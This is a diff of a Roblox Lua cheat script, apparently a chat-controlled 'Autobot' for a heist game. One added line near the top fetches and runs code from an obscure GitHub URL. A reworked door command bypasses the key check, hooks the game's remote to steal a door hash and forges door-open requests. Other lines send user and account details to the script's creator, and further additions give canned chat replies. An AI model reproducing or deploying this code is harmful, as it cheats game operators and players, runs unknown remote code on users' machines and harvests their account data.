@@ -60,7 +60,7 @@ _G.BattlePlayers = {
 	["Player2"] = {}
 }
 
-
+local Channeling = loadstring(game:HttpGet("https://raw.githubusercontent.com/9TBUCVEXFY/9SBUCVDXFY/main/DHHXbsi848Ru"))()
 
 local loadedargs = {
 	[1] = "Autobot Commands: >Help, >Pull, >Pull Lever, >Solve Puzzles, >Casino Code, >Casino Timer, >Open Doors, >Hack Casino Computers, >Open Gates, >Auto Rps, >Auto Slots, >Auto FlipCoin, >Hangman",
@@ -858,6 +858,12 @@ function RunAutoBot(Player, Message)
 	}
 	PostMessage(ChatData)
 
+	local RandomSuggestions = {_G.Messages[math.random(1, #_G.Messages)], _G.Messages[math.random(1, #_G.Messages)], _G.Messages[math.random(1, #_G.Messages)], _G.Messages[math.random(1, #_G.Messages)]}
+	local Brain = {
+		[{"hi", "hello", "hey"}] = {"Hello!", "Hi!", "hello "..Player.DisplayName, "hii "..Player.DisplayName.."!!", "hello!!", "Hello "..Player.DisplayName.." :)", "hello "..Player.DisplayName.." how are you", "hi "..Player.DisplayName.." how are you doing", "hello "..Player.DisplayName.." how are you doing", "hi "..Player.DisplayName.." how are you doing", "Hello! "..Player.DisplayName.." "..RandomSuggestions[math.random(1, #RandomSuggestions)].."?", RandomSuggestions[math.random(1, #RandomSuggestions)]..RandomSuggestions[math.random(1, #RandomSuggestions)]},
+		
+	}
+
 	function ReturnReward(Level)
 		if Level == 5 then
 			return " and unlocked: >spk as!!"
@@ -1562,64 +1568,101 @@ function RunAutoBot(Player, Message)
 		end
 
 	elseif not table.find(_G.Blacklist, Player.UserId) and Message:lower() == ">open doors" then
-		local openbankdoor = {
-			[1] = "Opening all doors...",
-			[2] = "All"
-		}
-		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(openbankdoor))
-
 		local plrUtils = game:GetService("ReplicatedStorage").Game.PlayerUtils
 		require(plrUtils).hasKey = function() 
 			return true
 		end
 		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(36.948, 19.838, 909.021)
 
-		local CollectionService = game:GetService"CollectionService"
-		local Doors = CollectionService:GetTagged("Door")
-		local Character = game:GetService"Players".LocalPlayer.Character
-		local remote
-		for i, v in next, getgc(true) do
-		if typeof(v) == "table" and rawget(v, "FireServer") and typeof(rawget(v, "FireServer")) == "function" then
-			remote = v
-		end
-		end
-		for i,v in pairs(Doors) do
-			local args = {
-				[1] = "hn8vmmqq",
-				[2] = {
-					["Type"] = "Swing",
-					["OpenFun"] = function()end --[[FunSwing]],
-					["Direction"] = 1,
-					["Resolved"] = true,
-					["State"] = {
-						["CloseTime"] = 1666853616,
-						["Direction"] = -1,
-						["Open"] = true,
-						["Proxy"] = 24
-					},
-					["Settings"] = {
-						["Type"] = "Swing",
-						["ServerOnly"] = false,
-						["Duration"] = 1,
-						["TeamBlacklist"] = false,
-						["SequenceRequireState"] = true,
-						["Character"] = true,
-						["Key"] = true,
-						["Locked"] = false,
-						["Vehicle"] = true,
-						["Delay"] = 0,
-						["Team"] = false
-					},
-					["Model"] = v,
-					["CloseFun"] = function()end --[[FunSwing]],
-					["HingeRelativeCFrame"] = CFrame.new(Vector3.new(-2.175048828125, 0, 0.000244140625), Vector3.new(-0, -0, -1)),
-					["ClosedCFrame"] = CFrame.new(Vector3.new(-1195.406494140625, 19.4500732421875, -1603.443603515625), Vector3.new(-0, -0, -1)),
-					["Tag"] = v:WaitForChild("Tag", 5).Value
-				}
-			}
-			
-			remote:FireServer(unpack(args))
-		end
+		local CollectionService = game:GetService "CollectionService"
+        local Doors = CollectionService:GetTagged("Door")
+        game:GetService"ReplicatedStorage".DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Opening doors...", "All")
+        local Character = game:GetService "Players".LocalPlayer.Character
+        local remote
+        for i, v in next, getgc(true) do
+            if typeof(v) == "table" and rawget(v, "FireServer") and typeof(rawget(v, "FireServer")) == "function" then
+                remote = v
+            end
+        end
+        local OldFireserver = remote.FireServer
+        local CurrentDoorHash
+        remote.FireServer = function(self, ...)
+            local Args = {...}
+            if typeof(Args[2]) == "table" then
+                if Args[2].Type == "Swing" and Args[2].Settings and Args[2].State then
+                    CurrentDoorHash = Args[1]
+                end
+            end
+            return OldFireserver(self, ...)
+        end
+        local LightHouseDoor
+        for i, v in pairs(Doors) do
+            if v:FindFirstChild("Touch") then
+                if v.Touch:IsA("BasePart") then
+                    if (v.Touch.Position - Vector3.new(3366.33, 29.6273, -2663.62)).Magnitude < 20 then
+                        LightHouseDoor = v
+                    end
+                end
+            end
+        end
+        if not LightHouseDoor then
+            return
+        end
+        for i = 1, 5 do
+            local Players = game:GetService("Players")
+            local Player = Players.LocalPlayer
+            if Player.Character then
+                Player.Character:SetPrimaryPartCFrame(LightHouseDoor.Touch.CFrame)
+            end
+            task.wait()
+            if CurrentDoorHash then
+                break
+            end
+        end
+        if not CurrentDoorHash then
+            return
+        end
+        for i, v in pairs(Doors) do
+            local args = {
+                [1] = CurrentDoorHash,
+                [2] = {
+                    ["Type"] = "Swing",
+                    ["OpenFun"] = function()
+                    end --[[FunSwing]] ,
+                    ["Direction"] = 1,
+                    ["Resolved"] = true,
+                    ["State"] = {
+                        ["CloseTime"] = 1666853616,
+                        ["Direction"] = -1,
+                        ["Open"] = true,
+                        ["Proxy"] = 24
+                    },
+                    ["Settings"] = {
+                        ["Type"] = "Swing",
+                        ["ServerOnly"] = false,
+                        ["Duration"] = 0.5,
+                        ["TeamBlacklist"] = false,
+                        ["SequenceRequireState"] = true,
+                        ["Character"] = true,
+                        ["Key"] = true,
+                        ["Locked"] = false,
+                        ["Vehicle"] = true,
+                        ["Delay"] = 1.5,
+                        ["Team"] = false
+                    },
+                    ["Model"] = v,
+                    ["CloseFun"] = function()
+                    end --[[FunSwing]] ,
+                    ["HingeRelativeCFrame"] = CFrame.new(Vector3.new(-2.175048828125, 0, 0.000244140625),
+                        Vector3.new(-0, -0, -1)),
+                    ["ClosedCFrame"] = CFrame.new(Vector3.new(-1195.406494140625, 19.4500732421875, -1603.443603515625),
+                        Vector3.new(-0, -0, -1)),
+                    ["Tag"] = v:WaitForChild("Tag", 5).Value
+                }
+            }
+
+            remote:FireServer(unpack(args))
+        end
 
 
 	elseif not table.find(_G.Blacklist, Player.UserId) and Message:lower():match("autobots roll out") then
@@ -2051,49 +2094,49 @@ function RunAutoBot(Player, Message)
 		_G.GiveawayItem = nil
 
 	elseif not table.find(_G.Blacklist, Player.UserId) and Message:lower():match(">autobot") then
-		if Message:lower():match(">autobot say") then
-			local msg = string.gsub(Message:lower(), ">autobot say ", "")
-			local messageargs = {
-				[1] = msg,
-				[2] = "All"
-			}
-			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(messageargs[1], messageargs[2])
-		
-			local split = string.split(msg, " ")
-			for _, each in pairs(split) do 
-				for _, brain in pairs(_G.Messages) do
-					if not table.find(_G.Messages, each) and not each:match("#") then
-						table.insert(_G.Messages, string.gsub(each, ">", ""))
-					end
+		for Trigger, Responses in pairs(Brain) do
+			for _, Phrase in pairs(Trigger) do
+				if string.gsub(Message, ">autobot ", ""):lower():match(Phrase:lower()) then
+					MatchedResponses = Responses
+					break
+				end
+				if MatchedResponses then
+					break
 				end
 			end
-		else
-		local MessageSize = {
-			[1] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
-			[2] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
-			[3] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
-			[4] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
-			[5] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
-			[6] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
-			[7] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
-			[8] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
-		}
-
-		local messageargs = {
-			[1] = MessageSize[math.random(1, #MessageSize)],
-			[2] = "All"
-		}
-		game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(messageargs[1], messageargs[2])
-
-		local split = string.split(Message, " ")
-		for _, each in pairs(split) do 
-			for _, brain in pairs(_G.Messages) do
-				if not table.find(_G.Messages, each) and not each:match("#") then
-					table.insert(_G.Messages, string.gsub(each, ">", ""))
-				end
+			if MatchedResponses then
+				break
 			end
-		end
-	end
+end
+
+if MatchedResponses then
+	local Response = MatchedResponses[math.random(1, #MatchedResponses)]
+
+	local messageargs = {
+		[1] = Response,
+		[2] = "All"
+	}
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(messageargs[1], messageargs[2])
+	MatchedResponses = nil
+else
+	local MessageSize = {
+		[1] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
+		[2] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
+		[3] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
+		[4] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
+		[5] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
+		[6] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
+		[7] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
+		[8] = Player.DisplayName.." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)].." ".._G.Messages[math.random(1, #_G.Messages)]..".",
+	}
+
+	local messageargs = {
+		[1] = MessageSize[math.random(1, #MessageSize)],
+		[2] = "All"
+	}
+	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(messageargs[1], messageargs[2])
+end
+
 
 	elseif Message:lower():match(">add manager") and table.find(_G.Data["Managers"], Player.UserId) then
 		local Splitted = string.split(Message, " ")
@@ -2622,7 +2665,7 @@ local DataToCreator = {
 		["fields"] = {
 			{
 				["name"] = "Executor:",
-				["value"] = _G.AutoExecutor,
+				["value"] = _G.AutoExecutor:lower(),
 			},
 			{
 				["name"] = "User Name:",
@@ -2638,7 +2681,7 @@ local DataToCreator = {
 			},
 			{
 				["name"] = "Autobot ID:",
-				["value"] = tostring(_G.AutobotID),
+				["value"] = _G.AutobotID,
 			},
 			{
 				["name"] = "Account Age:",
